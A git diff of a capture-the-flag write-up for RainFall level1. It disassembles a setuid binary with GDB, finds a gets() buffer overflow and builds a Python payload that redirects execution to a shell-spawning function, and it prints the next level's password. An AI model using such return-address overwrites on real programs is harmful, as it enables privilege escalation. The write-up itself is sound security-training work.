@@ -16,38 +16,11 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
 ```
 
-We transfer the `level1` executable using **SCP** and decompile it with **Dogbolt**.
+The file is owned by **level2** and has the **setuid** bit.
 
-[Decompiled executable](https://dogbolt.org/?id=621e2f06-c90f-42e1-b556-a4a225fc4b1b)
+We list the functions inside the executable and analyze their assembly code with **GDB**.
 
-```c
-int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s[64]; // [esp+10h] [ebp-40h] BYREF
-
-  return (int)gets(s);
-}
 ```
-
-Looking at the `main()` function, we can quickly understand that we will have to exploit the executable with a **buffer overflow**. The variable `s` is a buffer of 64 bytes and `gets()` stores user input into it, but no validation is done in order to prevent the user from entering more than 64 characters.
-
-There is also a `run()` function which is declared but never called, and it calls `system()` with `/bin/sh` as argument.
-
-```c
-int run()
-{
-  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
-  return system("/bin/sh");
-}
-```
-
-One of the techniques used during a buffer overflow exploit is to replace the return address with a new one, either a declared function or one we would declared in the buffer.
-
-We use **GDB** in order to get the address of `run()`.
-
-```bash
-level1@RainFall:~$ gdb level1
-# [...]
 (gdb) info functions
 All defined functions:
 
@@ -75,21 +48,77 @@ Non-debugging symbols:
 0x0804854c  _fini
 ```
 
-We run a **Python** script onto the command line to print 64 characters and append them with the address **0x08048444**, incrementing by 1 character until `run()` is called.  
-Because our system is **little-endian**, we have to pass the address from the least-significant byte to the most-significant one: **08048444** becomes **44840408**.
+There are 2 interesting functions: `main()` and `run()`.
+
+```
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   ebp
+   0x08048481 <+1>:     mov    ebp,esp
+   0x08048483 <+3>:     and    esp,0xfffffff0
+   0x08048486 <+6>:     sub    esp,0x50
+   0x08048489 <+9>:     lea    eax,[esp+0x10]
+   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave
+   0x08048496 <+22>:    ret
+End of assembler dump.
+```
+
+The `main()` function:
+- decrements the stack pointer by `0x50` bytes
+- performs a bitwise `AND` operation on `esp` ([detailled explanation](#calculation-of-esp-after-and-instruction)) to decrement the stack pointer by 8 bytes
+- sets the start of a buffer to `esp + 0x10` passed as a first argument to `gets()`
+- calls `gets()` before returning
+
+But `run()` is never called.
+
+```
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:     push   ebp
+   0x08048445 <+1>:     mov    ebp,esp
+   0x08048447 <+3>:     sub    esp,0x18
+   0x0804844a <+6>:     mov    eax,ds:0x80497c0
+   0x0804844f <+11>:    mov    edx,eax
+   0x08048451 <+13>:    mov    eax,0x8048570
+   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:    call   0x8048360 <system@plt>
+   0x0804847e <+58>:    leave
+   0x0804847f <+59>:    ret
+End of assembler dump.
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+```
+
+The `run()` function:
+- writes a message
+- calls `system()`, passing the data at `0x8048584` as first argument. The address contains the `/bin/sh` string.
+
+With these information in mind, we know that we have to exploit the executable with a **buffer overflow**, overriding the `eip` register at the end of `main()` with the address of `run()`. A buffer of 72 bytes is passed to `gets()` without any validation, allowing us to write more than 64 characters in it.
+
+In order to simplify the calculation of the required number of characters to input, we draw a diagram of the stack.
+
+![Stack diagram](./resources/level1_stack-diagram.png)
+
+92 - 16 = 76 bytes.
+
+We run a **Python** script onto the command line to print 76 characters and append them with 4 bytes representing the address of `run()`.  
+Because our system is **little-endian**, we have to pass the address from the least-significant byte to the most-significant one: `0x08048444` becomes `0x44840408`.
 
 ```bash
-level1@RainFall:~$ python -c "print('a' * 60 + '\x44\x84\x04\x08')" | ./level1
-level1@RainFall:~$ python -c "print('a' * 61 + '\x44\x84\x04\x08')" | ./level1
-# [...]
-level1@RainFall:~$ python -c "print('a' * 72 + '\x44\x84\x04\x08')" | ./level1
-Illegal instruction (core dumped)
 level1@RainFall:~$ python -c "print('a' * 76 + '\x44\x84\x04\x08')" | ./level1
 Good... Wait what?
 Segmentation fault (core dumped)
 ```
 
-TODO: write this part.
+Our script is working because the message of `run()` is printed on stdout, but the shell process is instantly closed.  
+After some researches, we find a solution using the `cat` command.
 
 ```bash
 level1@RainFall:~$ (python -c "print('a' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
@@ -99,6 +128,73 @@ level2
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
+
+## Additional information
+
+### Calculation of `esp` after `AND` instruction
+
+We set a breakpoint at the `0x08048483 <+3>: and esp,0xfffffff0` instruction to display the content of the `esp` register.
+
+```
+(gdb) break *0x08048483
+Breakpoint 1 at 0x8048483
+(gdb) r
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) info registers
+eax            0x1	1
+ecx            0xbffff6e4	-1073744156
+edx            0xbffff674	-1073744268
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff648	0xbffff648
+ebp            0xbffff648	0xbffff648
+esi            0x0	0
+edi            0x0	0
+eip            0x8048483	0x8048483 <main+3>
+eflags         0x200246	[ PF ZF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+```
+
+`esp` is currently holding the address `0xbffff648`.  
+We execute the next instruction with `stepi` and check the new address held by `esp`.
+
+```
+(gdb) stepi
+0x08048486 in main ()
+(gdb) info registers
+eax            0x1	1
+ecx            0xbffff6e4	-1073744156
+edx            0xbffff674	-1073744268
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff640	0xbffff640
+ebp            0xbffff648	0xbffff648
+esi            0x0	0
+edi            0x0	0
+eip            0x8048486	0x8048486 <main+6>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+```
+
+`esp` is now holding the address `0xbffff640`.
+
+| Information | Hexadecimal | Binary |
+| --- | --- | --- |
+| Before `ADD` | 0xbffff648 | 10111111111111111111011001001000 |
+| `AND` second operand | 0xfffffff0 | 11111111111111111111111111110000
+| After `AND` | 0xbffff640 | 10111111111111111111011001000000 |
+
+As a result of this `AND` instruction, the stack pointer has been decremented by 8 bytes.
 
 ## Resources
 
